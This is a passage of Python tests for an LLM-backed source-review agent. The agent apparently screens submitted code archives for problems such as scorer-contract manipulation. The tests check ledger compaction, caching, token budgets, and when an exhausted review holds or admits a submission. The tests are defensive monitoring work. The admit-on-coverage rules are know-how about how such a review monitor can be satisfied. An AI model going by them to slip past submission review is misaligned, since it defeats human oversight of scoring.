    ]
    for turn in range(6):
        messages.extend(
            [
                {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [_tool(f"read-{turn}", "search", {"query": "x"})],
                },
                {
                    "role": "tool",
                    "tool_call_id": f"read-{turn}",
                    "content": f"large-output-{turn}",
                },
            ]
        )
    notes = [
        {
            "kind": "cleared",
            "area": "served_entrypoint",
            "category": "none",
            "summary": "Entrypoint follows the normal path.",
            "stage": "l1",
        }
    ]

    compacted = source_review_module._compacted_review_messages(messages, notes)

    assert compacted[:2] == messages[:2]
    assert "recorded notes ledger" in str(compacted[2]["content"])
    assert "large-output-0" not in json.dumps(compacted)
    assert "large-output-5" in json.dumps(compacted)
    assert sum(row.get("role") == "assistant" for row in compacted) == 3


async def test_l1_uses_cached_prefix_adaptive_reasoning_and_coverage_exit(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    final = {
        "risk_level": "low",
        "confidence": 0.9,
        "categories": ["none"],
        "evidence": [],
        "summary": "General model-backed request path.",
    }
    areas = [
        "served_entrypoint",
        "retrieval",
        "model_call",
        "tool_dispatch",
        "answer_construction",
    ]

    def handler(request: httpx.Request) -> httpx.Response:
        payload = json.loads(request.content)
        seen.append(payload)
        if len(seen) == 1:
            tool_calls = [
                _note_call(
                    f"note-{index}",
                    "cleared",
                    f"{area} follows the normal served path.",
                    area=area,
                )
                for index, area in enumerate(areas)
            ]
            tool_calls.extend(
                [
                    _tool(
                        "read-1",
                        "read_file",
                        {"path": "src/main.rs", "start_line": 1, "end_line": 40},
                    ),
                    _tool("search-1", "search", {"query": "call_model"}),
                ]
            )
        else:
            tool_calls = [_tool("submit-1", "submit_review", final)]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert seen[0]["reasoning"] == {"effort": "medium"}
    assert seen[1]["reasoning"] == {"effort": "high"}
    assert seen[0]["prompt_cache_key"] == seen[1]["prompt_cache_key"]
    assert len(str(seen[0]["prompt_cache_key"])) <= 64
    assert any(
        "notes ledger now covers every served-path area" in str(row.get("content"))
        for row in seen[1]["messages"]
    )
    assert "BATCH RELATED READS" in str(seen[0]["messages"][0]["content"])


async def test_budget_exhaustion_with_concern_notes_holds_with_evidence(
    tmp_path: Path,
) -> None:
    """A review that dies at its step budget ships its ledger and holds."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        tool_calls = (
            [
                _note_call(
                    "note-1",
                    "concern",
                    "Reachable host gate rejects model drafts on derived values.",
                    category="scorer_contract_manipulation",
                    path="src/main.rs",
                    line=7,
                    confidence=0.8,
                ),
                _tool(
                    "read-1",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 40},
                ),
            ]
            if calls == 1
            else [
                _tool(
                    "read-" + str(calls),
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 40},
                )
            ]
        )
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-step-budget-exhausted"
    assert observation.failure_disposition == "inconclusive"
    assert [note["kind"] for note in observation.notes] == ["concern"]
    note = observation.notes[0]
    assert note["category"] == "scorer_contract_manipulation"
    assert note["path"] == "src/main.rs"
    assert note["line"] == 7
    assert note["confidence"] == 0.8


async def test_budget_exhaustion_with_cleared_coverage_admits(
    tmp_path: Path,
) -> None:
    """Zero concerns + enough cleared notes = admission on positive coverage."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls == 1:
            tool_calls = [
                _note_call(
                    "n1", "cleared", "Entrypoint routes to a genuine model call."
                ),
                _note_call(
                    "n2", "cleared", "Tool dispatch executes model-authored calls."
                ),
                _note_call("n3", "cleared", "Answer construction forwards model text."),
            ]
        else:
            tool_calls = [
                _tool(
                    "read-" + str(calls),
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 40},
                )
            ]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.failure_disposition == "pass_inconclusive"
    assert len(observation.notes) == 3


async def test_budget_exhaustion_with_thin_ledger_still_holds(
    tmp_path: Path,
) -> None:
    """No concerns but too little positive coverage cannot silently admit."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    def handler(_request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [
                                _tool(
                                    "read-1",
                                    "read_file",
                                    {
                                        "path": "src/main.rs",
                                        "start_line": 1,
                                        "end_line": 40,
                                    },
                                )
                            ],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.failure_disposition == "inconclusive"
    assert observation.notes == ()


async def test_completion_budget_fits_a_whole_policy_v10_sweep(
    tmp_path: Path,
) -> None:
    """The verdict turn is not truncated at the historical 2200-token cap.

    A cut-off ``submit_review`` argument string used to die on
    ``JSONDecodeError`` and burn the whole attempt as infrastructure, so the
    budget the request carries is a correctness property, not a tuning knob.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    transport = _transport(_BENIGN_REVIEW, seen)

    observation = await _agent(key, transport).review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
    )

    assert observation.ok
    assert seen
    assert all(request["max_completion_tokens"] == 8_000 for request in seen)


async def test_completion_budget_is_operator_settable(tmp_path: Path) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    agent = OpenRouterSourceReviewAgent(
        api_key_file=str(key),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=4,
        max_completion_tokens=12_000,
        transport=_transport(_BENIGN_REVIEW, seen),
    )

    observation = await agent.review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
    )

    assert observation.ok
    assert all(request["max_completion_tokens"] == 12_000 for request in seen)


async def test_completion_budget_cannot_be_set_below_one_sweep(
    tmp_path: Path,
) -> None:
    """A floor keeps a misconfiguration from re-creating the truncation bug."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    agent = OpenRouterSourceReviewAgent(
        api_key_file=str(key),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=4,
        max_completion_tokens=64,
        transport=_transport(_BENIGN_REVIEW, seen),
    )

    await agent.review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
    )

    assert all(request["max_completion_tokens"] == 2_000 for request in seen)
